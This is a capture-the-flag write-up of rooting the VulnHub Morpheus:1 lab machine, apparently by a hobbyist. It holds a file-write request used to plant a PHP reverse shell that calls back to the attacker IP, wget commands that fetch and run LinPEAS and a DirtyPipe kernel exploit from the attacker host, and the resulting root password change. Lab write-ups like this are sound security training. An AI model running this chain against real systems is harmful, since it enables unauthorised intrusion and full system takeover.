# Morpheus:1 — VulnHub Boot2Root Write-Up

> **Target:** Morpheus:1 (VulnHub)  
> **Attacker IP:** `192.168.56.12`  
> **Target IP:** `192.168.56.18`  
> **Objective:** Root the box and capture both flags.

---

## 1. Reconnaissance

### 1.1 Host Discovery

After bringing the VM online, I ran an `ifconfig` to confirm my attacker interface, then swept the lab network for live hosts.

```bash
$ ifconfig
# eth0: inet 192.168.56.12

$ nmap -sn 192.168.56.0/24
```

The scan revealed the target at **`192.168.56.18`** (Oracle VirtualBox virtual NIC).

### 1.2 Service Enumeration

Next, I ran an aggressive Nmap scan against the target to map the attack surface.

```bash
$ nmap -A 192.168.56.18
```

**Open ports found:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian 5 (protocol 2.0) |
| 80/tcp | HTTP | Apache httpd 2.4.51 ((Debian)) |
| 81/tcp | HTTP | nginx 1.18.0 (Basic Auth required) |

The web server on port 80 returned a **Boot2Root CTF** landing page themed after *The Matrix* — "Welcome to the Boot2Root CTF, Morpheus:1." Port 81 presented an HTTP Basic Auth dialog (`realm="Meeting Place"`), which I noted for later.

---

## 2. Web Enumeration

### 2.1 Content Discovery

I fired up **Gobuster** to brute-force directories and files on port 80.

```bash
$ gobuster dir -u http://192.168.56.18 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .php,.txt,.html
```

**Notable findings:**

- `/index.html`
- `/1.php`
- `/info.php`
- `/test.php`
- `/javascript/`
- `/robots.txt`
- `/alien.php`
- `/graffiti.txt`
- `/graffiti.php`
- `/server-status` (403 Forbidden)

Visiting `/robots.txt` returned a taunt: *"There's no white rabbit here. Keep searching!"*

### 2.2 The Graffiti Wall

`/graffiti.php` loaded a message board titled **"Nebuchadnezzar Graffiti Wall."** It allowed users to post messages, which were then written to `/graffiti.txt` and displayed on the page. This immediately smelled like a **file-write / path-traversal** vulnerability.

---

## 3. Exploitation — From Graffiti to Shell

### 3.1 Proxy Setup

To inspect the graffiti form submission, I routed Firefox through **Burp Suite**:

1. **Firefox → Settings → Network Settings → Settings…**
2. Selected **Manual proxy configuration**
3. Set **HTTP Proxy** to `127.0.0.1:8080` with **"Also use this proxy for HTTPS"** checked
4. In **Burp Suite → Proxy → Proxy settings**, confirmed the listener on `127.0.0.1:8080`
5. Turned **Intercept ON**

### 3.2 Intercepting the Request

I submitted a test message on the graffiti wall. Burp intercepted the POST request:

```http
POST /graffiti.php HTTP/1.1
Host: 192.168.56.18
...
Content-Type: application/x-www-form-urlencoded

message=to+be+intercepted+by+burp&file=graffiti.txt
```

The `file` parameter controlled the destination filename. This meant I could potentially write to **any** file the web server had permission to touch — including `.php` files in the web root.

### 3.3 Weaponizing the File Write

I grabbed **pentestmonkey's PHP reverse shell** from GitHub and edited the top variables to point back to my attacker machine:

```php
$ip = '192.168.56.12';   // CHANGE THIS
$port = 7777;            // CHANGE THIS
```

Back in Burp, I sent the intercepted graffiti POST to **Repeater** (`Ctrl+R`). I then replaced the message body with the entire contents of the PHP reverse shell and changed the `file` parameter from `graffiti.txt` to **`intercept.php`**:

```http
POST /graffiti.php HTTP/1.1
...

message=<?php ... // php-reverse-shell payload ... ?>&file=intercept.php
```

Clicking **Send** returned **`HTTP/1.1 200 OK`**. The shell had been written to `/intercept.php`.

### 3.4 Catching the Shell

On my attacker machine, I started a netcat listener:

```bash
$ nc -lvnp 7777
```

Then I visited `http://192.168.56.18/intercept.php` in the browser. The page hung — and my netcat listener lit up:

```
connect to [192.168.56.12] from (UNKNOWN) [192.168.56.18] 37650
Linux morpheus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I spawned a proper TTY for stability:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

A quick look around the filesystem revealed the first flag sitting in the root of the web tree:

```bash
www-data@morpheus:/$ ls /
www-data@morpheus:/$ cat FLAG.txt
Flag 1!
```

---

## 4. Privilege Escalation

### 4.1 Post-Exploitation Recon

With a low-privilege shell as `www-data`, I needed to escalate to root. I decided to run **LinPEAS** to automate the enumeration of misconfigurations and known CVEs.

> **Important:** When moving files from my attacker VM to the vulnerable machine, I made sure to `cd /tmp` first. The `/tmp` directory is universally writable and is the safest place to stage payloads without triggering permission errors or leaving obvious artifacts in user directories.

```bash
www-data@morpheus:/$ cd /tmp
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/linpeas1.sh
www-data@morpheus:/tmp$ chmod +x linpeas1.sh
www-data@morpheus:/tmp$ ./linpeas1.sh
```

LinPEAS flagged several kernel CVEs, but the most critical was **CVE-2022-0847 — DirtyPipe**.

### 4.2 DirtyPipe (CVE-2022-0847)

DirtyPipe is a Linux kernel vulnerability that allows unprivileged users to overwrite arbitrary files in read-only mounts — most notably `/etc/passwd` — by exploiting a flaw in the pipe buffer code. The target was running a vulnerable kernel (`5.10.70`), so this was a straight shot to root.

I cloned the public exploit repository:

```bash
# On attacker VM
$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

The repository included a `compile.sh` script. However, the original script produced dynamically-linked binaries. **The VulnHub machine does not have the necessary shared libraries to run standard compiled executables**, so I edited `compile.sh` to use **`gcc -static`** for static linking. This bakes all dependencies into the binary, making it portable to the target.

```bash
# Edited compile.sh
$ gcc -static exploit1.c -o exploit-9
$ gcc -static exploit2.c -o exploit-6
```

I then served the compiled binaries via a Python HTTP server from my attacker VM:

```bash
$ python3 -m http.server 5678
```

And pulled them down to the target (again, from `/tmp`):

```bash
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/exploit-9
www-data@morpheus:/tmp$ chmod +x exploit-9
www-data@morpheus:/tmp$ ./exploit-9
```

The exploit executed flawlessly:

```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
```

### 4.3 Becoming Root

With the root password now set to **`piped`**, I simply switched users:

```bash
www-data@morpheus:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@morpheus:/$ su root
Password: piped
root@morpheus:/# whoami
root
```

---

## 5. Capture the Final Flag

With root access secured, I navigated to `/root` and claimed the prize:

```bash
root@morpheus:/# cd /root
root@morpheus:/root# ls
FLAG.txt
root@morpheus:/root# cat FLAG.txt
You've won!

Let's hope Matrix: Resurrections rocks!
```

---

## 6. Summary of Attack Chain

| Phase | Technique | Tool / Payload |
|-------|-----------|----------------|
| Recon | Network & service scan | `nmap -sn`, `nmap -A` |
| Enumeration | Directory brute-force | `gobuster` |
| Exploitation | File-write via `file` parameter | Burp Suite + PHP reverse shell |
| Initial Access | Reverse shell callback | `nc -lvnp 7777` |
| Post-Exploitation | Automated privesc enumeration | `linpeas.sh` |
| Privilege Escalation | Kernel exploit (DirtyPipe) | `CVE-2022-0847` static binary |
| Root Access | Password overwrite + `su` | Custom-compiled `exploit-9` |

---

## 7. Key Takeaways

1. **Always use `gcc -static`** when compiling exploits for unknown target environments. Dynamically-linked binaries often fail on stripped-down VMs that lack standard libraries.
2. **Stage files in `/tmp`** when transferring payloads to a compromised host. It avoids permission issues and keeps your workflow clean.
3. **Intercept everything.** The graffiti wall looked benign until Burp revealed the `file` parameter — a perfect example of why proxying all traffic matters.
4. **Kernel version is king.** LinPEAS + a quick CVE check turned a potentially long privesc hunt into a single-exploit root.

---

*Write-up by itstallam | Morpheus:1 VulnHub*
